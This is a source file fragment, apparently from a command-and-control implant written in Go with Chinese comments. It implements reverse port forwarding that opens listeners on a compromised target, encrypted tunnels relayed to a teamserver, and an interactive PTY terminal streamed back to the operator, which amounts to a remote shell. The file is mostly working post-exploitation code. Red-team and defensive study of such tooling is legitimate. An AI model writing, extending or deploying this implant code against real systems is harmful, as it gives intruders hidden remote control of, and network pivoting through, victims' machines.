	axRpfLnsMu.Unlock()
	if old != nil && old != ln {
		_ = old.Close() // 同端口被顶替：关掉上一个，避免泄漏
	}
}

func axTakeRpfListener(port int) (net.Listener, bool) {
	axRpfLnsMu.Lock()
	old, ok := axRpfLns[port]
	delete(axRpfLns, port)
	axRpfLnsMu.Unlock()
	return old, ok
}

func axDelRpfListener(port int, ln net.Listener) {
	axRpfLnsMu.Lock()
	if cur, ok := axRpfLns[port]; ok && cur == ln {
		delete(axRpfLns, port)
	}
	axRpfLnsMu.Unlock()
}

// axRandChannelId 生成反向通道的 channelId。
// ★ 用 crypto/rand（本文件既有 idiom，与 tunKey/tunIv 的 rand.Read 同源），不用 math/rand：
// 正向通道的 channelId 由 teamserver 分配、反向由 agent 自分配，两者共用 agent 侧
// TUNNELS 这张按 channelId 索引的表 ⇒ 小值、可预测的 id 有撞表风险。
// ★ 掩掉最高位：agent 要交叉编译到 6 个平台（含 32 位），那里 int 是 32 位，
// 不自掩会得到负数。
func axRandChannelId() int {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 0
	}
	v := uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
	return int(v & 0x7fffffff)
}

// taskTunnelReverse 在**目标机**上监听 params.Port（rportfwd 的第一步）。
//
// 与 jobTunnel 的区别：jobTunnel 是「teamserver 让我去连某处」，
// 这里是「teamserver 让我开一个监听」—— 方向相反，所以监听地址是 0.0.0.0
// （rportfwd 的全部意义就是让外部能连到目标机的这个端口；
// 上游 TsTunnelCreateRportfwd 没有 Lhost 参数，也无法收窄）。
//
// ★ 返回值即「监听起没起」，作为任务回答回给 teamserver（走 Type-1）。
func taskTunnelReverse(paramsData []byte) ([]byte, error) {
	var params utils.ParamsTunnelReverse
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", params.Port))
	if err != nil {
		// ★ 同端口重新启用（stop → start）：core 保留 inactive entry 并**重新下发**本任务
		//   （ts_tunnels.go:432-443 "keep id for enable/stop lifecycle"），但 stop 时
		//   core 通知不到 agent（见 axRpfLns 的注释）⇒ 旧 listener 仍在 ⇒ 这里 EADDRINUSE。
		//   ⇒ 若占用者**是本 agent 为同一端口建的旧 listener**，关掉它再试一次；
		//     外来占用者（别人的进程）**仍然失败** —— 这是判据 J1b 的前提，不得放宽。
		if old, ok := axTakeRpfListener(params.Port); ok {
			_ = old.Close()
			ln, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", params.Port))
		}
	}
	if err != nil {
		// 监听失败也要回结果 —— 让 GUI 显示失败，而不是永远停在「看起来成功」。
		return msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 0})
	}

	axPutRpfListener(params.Port, ln)

	go func() {
		defer axDelRpfListener(params.Port, ln)
		for {
			c, aerr := ln.Accept()
			if aerr != nil {
				_ = ln.Close()
				return
			}
			go tunnelReverseConn(c, params.TunnelId)
		}
	}()

	return msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 1})
}

// tunnelReverseConn 把一条 accept 到的外部连接，经 C2 通道交给 teamserver。
//
// ★★ 顺序是硬要求，反了就是改造前那种「静默假成功」：
// teamserver 侧 pl_transport.go 的 TUNNEL_PACK 分支**先查** TsTunnelChannelExists，
// 通道不存在直接拒收。而反向的通道是 **agent 主动申请**的，teamserver 事先
// 不可能知道 channelId ⇒ 必须先推 COMMAND_TUNNEL_ACCEPT 让它建通道
// （并在那里 net.Dial(Fhost:Fport)），再开 TUNNEL_PACK。
func tunnelReverseConn(clientConn net.Conn, tunnelId int) {
	// channelId 由 agent 侧分配：反向是 agent 主动开通道，teamserver 无法预先指定。
	// （正向相反 —— 上游 beacon 的 channelId 直接取 teamserver 下发的 TaskId。）
	channelId := axRandChannelId()
	if channelId == 0 {
		_ = clientConn.Close()
		return
	}

	// ★ 批次9b：不再另开连接向 teamserver 通告 ACCEPT。
	//   本 agent 的主连接是**严格一问一答**的，没有「agent 主动推送」的载体；
	//   而三条上行通道（EXFIL/JOB/BOF）都有 TsTaskRunningExists 门。
	//   改为把 TunnelId 随 TUNNEL_PACK 带上 —— listener 见「通道不存在且
	//   TunnelId != 0」时现场建通道（TsTunnelConnectionAccept）再复检放行。
	//   净效果：少一条到 teamserver 的连接、少一个协议常量、且 fail-closed。
	// 把连接交给 jobTunnel 的管道（复用，不重写）
	axPutPreconn(channelId, clientConn)
	params, _ := msgpack.Marshal(utils.ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, TunnelId: tunnelId})
	jobTunnel(params)
}

func jobTunnel(paramsData []byte) {
	var params utils.ParamsTunnelStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		reason := byte(0)
		clientConn, err := net.DialTimeout(params.Proto, params.Address, pivotDialTimeout)

		// ★ 批次9（rportfwd）：反向端口转发的 clientConn 是 **accept 来的**，不是 dial 来的。
		//   命中「预置连接表」就丢弃这次 dial 的结果、改用预置连接。
		//   ★ 插入点**特意选在 dial 之后**而不是之前 —— 这样上面那行 dial 一个字都不用改，
		//     「正向路径逐字节不变」就成了字面事实，而不是我的断言。
		//   反向时 params.Address 为空 ⇒ net.DialTimeout 立即报 missing port 返回整数，
		//   不产生任何网络流量、不解析任何名字；随后被这里的 err = nil 覆盖。
		if pre, ok := axTakePreconn(params.ChannelId); ok {
			if clientConn != nil {
				_ = clientConn.Close()
			}
			clientConn = pre
			err = nil
		}
		if err != nil {
			active = false
			var opErr *net.OpError
			if errors.As(err, &opErr) {
				if opErr.Timeout() {
					reason = 4
				}
				if errors.Is(syscall.ECONNREFUSED, opErr.Err) {
					reason = 5
				}
				if errors.Is(syscall.ENETUNREACH, opErr.Err) {
					reason = 3
				}
			}
		}

		var srvConn net.Conn
		srvConn, err = DialProfile(profile, profile.Addresses[0])
		if err != nil {
			if srvConn != nil {
				srvConn.Close()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, TunnelId: params.TunnelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TUNNEL_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				return
			}
		}

		/// Send Init
		functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		// ★ D2：两方向**必须**各用派生的密钥。enc 发往服务端 ⇒ a2s；dec 收自服务端 ⇒ s2a。
		// ★ 顺带修 S3：原先 `_` 丢弃 aes.NewCipher 的 error。
		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunA2S))
		if err != nil {
			_ = srvConn.Close()
			_ = clientConn.Close()
			return
		}
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunS2A))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		ctrl := &TunnelController{
			Cancel: cancel,
		}
		TUNNELS.Store(params.ChannelId, ctrl)
		defer TUNNELS.Delete(params.ChannelId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = clientConn.Close()
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			io.Copy(clientConn, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			buf := make([]byte, 32*1024)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if ctrl.Paused.Load() {
						time.Sleep(50 * time.Millisecond)
						continue
					}

					clientConn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
					nr, er := clientConn.Read(buf)
					if nr > 0 {
						_, ew := streamWriter.Write(buf[0:nr])
						if ew != nil {
							closeAll()
							return
						}
					}
					if er != nil {
						if netErr, ok := er.(net.Error); ok && netErr.Timeout() {
							continue
						}
						closeAll()
						return
					}
				}
			}
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()

		cancel()
	}()
}

func jobTerminal(paramsData []byte) {
	var params utils.ParamsTerminalStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		status := ""

		process := exec.Command(params.Program)
		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
		if err != nil {
			active = false
			status = err.Error()
		}

		var srvConn net.Conn
		srvConn, err = DialProfile(profile, profile.Addresses[0])
		if err != nil {
			if active {
				functions.StopPty(ptyProc)
				_ = process.Process.Kill()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TERMINAL_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				if active {
					functions.StopPty(ptyProc)
					_ = process.Process.Kill()
				}
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		// ★ D2：两方向**必须**各用派生的密钥。agent 的 enc 是 agent→server（a2s），dec 是 server→agent（s2a）。
		// ★ 顺带修 S3：原先 `_` 丢弃 aes.NewCipher 的 error。
		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermA2S))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermS2A))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TERMINALS.Store(params.TermId, cancel)
		defer TERMINALS.Delete(params.TermId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				time.Sleep(200 * time.Millisecond)
				_ = functions.StopPty(ptyProc)
				if functions.IsProcessRunning(process) {
					_ = process.Process.Kill()
				}
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			functions.RelayConnToPty(ptyProc, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			functions.RelayPtyToConn(streamWriter, ptyProc)
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()
		_ = process.Wait()
		cancel()
	}()
}
